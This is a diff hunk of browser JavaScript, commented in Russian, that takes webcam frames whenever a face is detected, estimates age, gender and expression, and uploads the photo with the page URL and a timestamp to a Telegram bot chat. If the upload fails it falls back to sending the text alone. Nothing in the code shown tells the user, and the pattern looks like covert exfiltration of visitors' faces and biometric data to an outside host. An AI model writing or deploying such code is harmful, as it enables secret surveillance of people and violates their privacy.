@@ -244,62 +244,79 @@
       const now = Date.now();
       if (now - lastSentTime < SEND_COOLDOWN) return;
       if (sending) return;
-      if (video.videoWidth === 0) return;
+      if (video.videoWidth === 0 || video.videoHeight === 0) return;
 
       sending = true;
       lastSentTime = now;
 
+      const confidence = (detection.detection.score * 100).toFixed(1);
+      const age = Math.round(detection.age);
+      const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
+      const genderProb = (detection.genderProbability * 100).toFixed(0);
+      const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
+      const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
+
+      const caption =
+        '🔍 Face Scan\n' +
+        '━━━━━━━━━━━━━━━\n' +
+        '📊 Уверенность: ' + confidence + '%\n' +
+        '🎂 Возраст: ~' + age + ' лет\n' +
+        '👤 Пол: ' + gender + ' (' + genderProb + '%)\n' +
+        '😐 Выражение: ' + topExpr + '\n' +
+        '━━━━━━━━━━━━━━━\n' +
+        '🕐 ' + new Date().toLocaleString('ru-RU') + '\n' +
+        '🌐 ' + location.href;
+
       try {
-        // Захватываем кадр
+        // Шаг 1: захватываем фото
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0);
+        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+        const base64 = dataUrl.split(',')[1];
 
-        // Конвертируем canvas в blob через Promise
-        const photoBlob = await new Promise((resolve, reject) => {
-          canvas.toBlob(blob => {
-            if (blob) resolve(blob);
-            else reject(new Error('toBlob вернул null'));
-          }, 'image/jpeg', 0.85);
-        });
+        // Превращаем base64 в blob
+        const binaryStr = atob(base64);
+        const bytes = new Uint8Array(binaryStr.length);
+        for (let i = 0; i < binaryStr.length; i++) {
+          bytes[i] = binaryStr.charCodeAt(i);
+        }
+        const blob = new Blob([bytes.buffer], { type: 'image/jpeg' });
 
-        console.log('Photo blob size:', photoBlob.size);
+        console.log('[TG] Blob size:', blob.size, 'Video:', video.videoWidth + 'x' + video.videoHeight);
 
-        const confidence = (detection.detection.score * 100).toFixed(1);
-        const age = Math.round(detection.age);
-        const gender = detection.gender === 'male' ? 'Мужской' : 'Женский';
-        const genderProb = (detection.genderProbability * 100).toFixed(0);
-        const sorted = Object.entries(detection.expressions).sort((a, b) => b[1] - a[1]);
-        const topExpr = exprMap[sorted[0][0]] || sorted[0][0];
+        // Шаг 2: отправляем фото
+        const fd = new FormData();
+        fd.append('chat_id', TG_CHAT_ID);
+        fd.append('caption', caption);
+        fd.append('photo', blob, 'face.jpg');
 
-        const caption =
-          '🔍 Face Scan\n' +
-          '━━━━━━━━━━━━━━━\n' +
-          '📊 Уверенность: ' + confidence + '%\n' +
-          '🎂 Возраст: ~' + age + ' лет\n' +
-          '👤 Пол: ' + gender + ' (' + genderProb + '%)\n' +
-          '😐 Выражение: ' + topExpr + '\n' +
-          '━━━━━━━━━━━━━━━\n' +
-          '🕐 ' + new Date().toLocaleString('ru-RU') + '\n' +
-          '🌐 ' + location.href;
+        const resp = await fetch(TG_API + '/sendPhoto', { method: 'POST', body: fd });
+        const result = await resp.json();
+        console.log('[TG] Response:', result.ok, result.description || 'OK');
 
-        const formData = new FormData();
-        formData.append('chat_id', TG_CHAT_ID);
-        formData.append('photo', photoBlob, 'scan.jpg');
-        formData.append('caption', caption);
-
-        console.log('Sending to Telegram...');
-
-        const resp = await fetch(TG_API + '/sendPhoto', {
-          method: 'POST',
-          body: formData
-        });
-
-        const data = await resp.json();
-        console.log('TG result:', JSON.stringify(data));
+        if (!result.ok) {
+          // Если фото не отправилось — отправим хотя бы текст
+          console.log('[TG] Photo failed, sending text...');
+          await fetch(TG_API + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: caption })
+          });
+        }
 
       } catch (e) {
-        console.error('TG error:', e);
+        console.error('[TG] Error:', e.message);
+        // Fallback — отправляем хотя бы текст
+        try {
+          await fetch(TG_API + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: caption + '\n\n⚠️ Фото не удалось отправить: ' + e.message })
+          });
+        } catch (e2) {
+          console.error('[TG] Fallback also failed:', e2.message);
+        }
       } finally {
         sending = false;
       }
